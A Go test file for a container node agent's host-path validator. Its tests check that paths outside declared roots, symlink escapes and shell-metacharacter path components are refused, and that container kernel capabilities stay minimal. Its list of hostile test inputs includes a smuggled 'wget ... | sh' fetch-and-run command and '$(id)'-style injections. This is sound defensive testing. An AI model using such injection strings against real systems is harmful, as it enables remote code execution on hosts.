// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 PersonifAI LLC

package docker

import (
	"context"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// declareRoot points this node's declaration at a temp dir and returns it,
// canonicalized the way the validator will see it (macOS /var -> /private/var).
func declareRoot(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("MODELS_DIR", "")
	t.Setenv("HF_CACHE_DIR", "")
	t.Setenv("OLLAMA_DATA_DIR", "")
	t.Setenv("NOO_SKILLS_HOST_DIR", "")
	t.Setenv(HostRootsEnv, "")
	t.Setenv("NOO_DATA_ROOT", dir)
	real, err := filepath.EvalSymlinks(dir)
	if err != nil {
		t.Fatal(err)
	}
	return real
}

// The finding, in one test: `models_dir: "/"` plus a controller-chosen
// image mounted the whole host filesystem into a root container on every
// node. hostDirAllowed is a denylist and never caught it.
func TestControllerCannotNameAPathOutsideTheDeclaredRoots(t *testing.T) {
	root := declareRoot(t)

	for _, p := range []string{
		"/",
		"/etc",
		"/etc/noo-node-agent.env",
		"/home",
		"/tmp",
		"/var/lib/docker",
		root + "/../..",
		filepath.Dir(root) + "-evil", // sibling: the boundary is a separator
	} {
		if got, err := ValidateHostPathUnderRoots(p); err == nil {
			t.Errorf("%q must be refused, got %q", p, got)
		}
	}

	// And the legitimate case still works, including a subdirectory that
	// does not exist yet — which is the whole point of EnsureHostDir.
	for _, p := range []string{root, root + "/models", root + "/models/gguf"} {
		if _, err := ValidateHostPathUnderRoots(p); err != nil {
			t.Errorf("%q is under the declared root and must be accepted: %v", p, err)
		}
	}
}

// A node that declares nothing accepts nothing. Fail closed: the safe end
// state for a box whose environment says nothing about where its data lives
// is "the controller does not get to choose", not "anywhere".
func TestNoDeclaredRootsRefusesEverything(t *testing.T) {
	for _, k := range []string{"MODELS_DIR", "NOO_DATA_ROOT", "HF_CACHE_DIR",
		"OLLAMA_DATA_DIR", "NOO_SKILLS_HOST_DIR", HostRootsEnv} {
		t.Setenv(k, "")
	}
	if roots := HostRoots(); len(roots) != 0 {
		t.Fatalf("expected no declared roots, got %v", roots)
	}
	_, err := ValidateHostPathUnderRoots("/data/noo/models")
	if err == nil {
		t.Fatal("a node that declares no roots must refuse every controller-chosen path")
	}
	if !strings.Contains(err.Error(), "NOO_DATA_ROOT") {
		t.Errorf("the refusal must name the fix, got %q", err)
	}
}

// A symlink planted inside a declared root is the classic way a string
// prefix test is defeated, so both sides are resolved before comparison.
func TestSymlinkOutOfTheRootIsRefused(t *testing.T) {
	root := declareRoot(t)
	link := filepath.Join(root, "escape")
	if err := os.Symlink("/etc", link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if got, err := ValidateHostPathUnderRoots(link); err == nil {
		t.Fatalf("a symlink out of the root must be refused, got %q", got)
	}
}

// The R17 half: the leaf used to be interpolated into `sh -c` unquoted in a
// ROOT helper container with the parent bind-mounted read-write.
func TestShellMetacharactersInAPathComponentAreRefused(t *testing.T) {
	for _, leaf := range []string{
		"models; wget http://x/y -O- | sh",
		"models && id",
		"models $(id)",
		"models`id`",
		"a b",
		"m|n",
		"m\nn",
		"..",
		".",
		"",
	} {
		if err := hostPathLeafOK(leaf); err == nil {
			t.Errorf("leaf %q must be refused", leaf)
		}
	}
	for _, leaf := range []string{"models", "hf-cache", "gguf_v2", "bge-reranker.v2"} {
		if err := hostPathLeafOK(leaf); err != nil {
			t.Errorf("leaf %q should be accepted: %v", leaf, err)
		}
	}
}

// EnsureHostDir must refuse BEFORE it reaches Docker. The client here has a
// nil docker handle, so anything that got as far as runHelper would panic —
// which is the assertion: a refusal is a plain error, not a crash.
func TestEnsureHostDirRefusesOutsideRootsWithoutTouchingDocker(t *testing.T) {
	root := declareRoot(t)
	c := &Client{}
	for _, dir := range []string{"/etc/noo", "/", "/home/operator/data", root + "/ok; id"} {
		err := func() (err error) {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("%q reached Docker (panicked: %v) instead of being refused", dir, r)
				}
			}()
			return c.EnsureHostDir(t.Context(), dir, "1000:1000")
		}()
		if err == nil {
			t.Errorf("%q must be refused", dir)
		}
	}
}

// The backend-container floor: every backend runs with no kernel
// capabilities beyond the small entrypoint set, and cannot regain them.
func TestBackendCapabilityFloor(t *testing.T) {
	t.Setenv(BackendCapsEnv, "")
	caps := backendCaps()
	for _, want := range []string{"CHOWN", "DAC_OVERRIDE", "FOWNER", "SETGID", "SETUID"} {
		if !contains(caps, want) {
			t.Errorf("backend caps must include %s (the entrypoint chown pattern), got %v", want, caps)
		}
	}
	for _, never := range []string{"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "NET_RAW",
		"NET_ADMIN", "MKNOD", "SYS_CHROOT", "ALL"} {
		if contains(caps, never) {
			t.Errorf("backend caps must never include %s, got %v", never, caps)
		}
	}

	// Widening is node-local, and "none" means none.
	t.Setenv(BackendCapsEnv, "none")
	if got := backendCaps(); len(got) != 0 {
		t.Errorf(`%s="none" must add nothing, got %v`, BackendCapsEnv, got)
	}
	t.Setenv(BackendCapsEnv, "ipc_lock, CAP_SYS_NICE")
	if got := backendCaps(); !contains(got, "IPC_LOCK") || !contains(got, "SYS_NICE") {
		t.Errorf("node-local widening must be honoured, got %v", got)
	}
}

func contains(ss []string, s string) bool {
	for _, v := range ss {
		if v == s {
			return true
		}
	}
	return false
}

// EnsureHostDir does the work in process. It used to run mkdir+chown inside a
// helper container, which needed the agent IMAGE — and no rail delivers that to
// a host-process node. Moving a data root then failed with
// `helper_image_missing`, whose named remedy (`sync-images`) declines
// node-agent refs and points at `upgrade-agents`, which needs a checkout the
// node does not have. A refusal loop, for a directory.
func TestEnsureHostDirCreatesTheDirectoryWithoutDocker(t *testing.T) {
	root := declareRoot(t)
	dir := root + "/models"
	// A nil docker client: reaching Docker at all would panic, which is the
	// assertion. The path is under a declared root, so it must be created.
	c := &Client{}
	if err := c.EnsureHostDir(context.Background(), dir, currentOwner()); err != nil {
		t.Fatalf("EnsureHostDir: %v", err)
	}
	st, err := os.Stat(dir)
	if err != nil || !st.IsDir() {
		t.Fatalf("directory not created: %v", err)
	}
	// Idempotent: a reconcile runs this every tick.
	if err := c.EnsureHostDir(context.Background(), dir, currentOwner()); err != nil {
		t.Errorf("second call must be a no-op, got %v", err)
	}
}

func TestResolveOwnerAcceptsTheShapesAChownWould(t *testing.T) {
	if uid, gid, err := resolveOwner("1234:5678"); err != nil || uid != 1234 || gid != 5678 {
		t.Errorf("uid:gid → (%d,%d,%v)", uid, gid, err)
	}
	// A bare uid uses it for both, matching the old default of "1000:1000".
	if uid, gid, err := resolveOwner("1000"); err != nil || uid != 1000 || gid != 1000 {
		t.Errorf("bare uid → (%d,%d,%v)", uid, gid, err)
	}
	if uid, gid, err := resolveOwner(""); err != nil || uid != 1000 || gid != 1000 {
		t.Errorf("empty → (%d,%d,%v)", uid, gid, err)
	}
	// A name that does not exist on this node is an ERROR, not a silent 0:0 —
	// chowning a model store to root is how a backend running as the operator
	// loses write access without anything saying so.
	if _, _, err := resolveOwner("nosuchuser-zzz"); err == nil {
		t.Error("an unknown owner name must be refused, not defaulted to root")
	}
}

func currentOwner() string {
	return strconv.Itoa(os.Getuid()) + ":" + strconv.Itoa(os.Getgid())
}

func TestEnsureHostDirNamesTheAncestorTheAgentCannotTraverse(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("root traverses everything; the diagnosis is for the agent's own user")
	}
	root := declareRoot(t)
	// A mount parent like /media/<user>: exists, owned by someone else,
	// no execute bit for us. chmod 0 on our own dir is the same thing to
	// a non-root process.
	parent := root + "/media-user"
	if err := os.Mkdir(parent, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(parent, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(parent, 0o755) })
	c := &Client{}
	err := c.EnsureHostDir(context.Background(), parent+"/drive/noo/ollama", currentOwner())
	if err == nil {
		t.Fatal("expected a refusal")
	}
	msg := err.Error()
	if !strings.Contains(msg, "not traversable") || !strings.Contains(msg, parent) {
		t.Fatalf("the error must name the ancestor, got: %s", msg)
	}
	if strings.Contains(msg, "mkdir "+parent+"/drive: permission denied") && !strings.Contains(msg, "setfacl") {
		t.Fatalf("still the misleading mkdir error only: %s", msg)
	}
}

func TestAgentEnvFileHintIsOSAware(t *testing.T) {
	if got := agentEnvFileHint("linux"); got != "/etc/noo-node-agent.env" {
		t.Fatalf("linux: %q", got)
	}
	if got := agentEnvFileHint("darwin"); !strings.Contains(got, "~/noomesh/agent.env") || strings.Contains(got, "/etc/") {
		t.Fatalf("darwin: %q", got)
	}
}
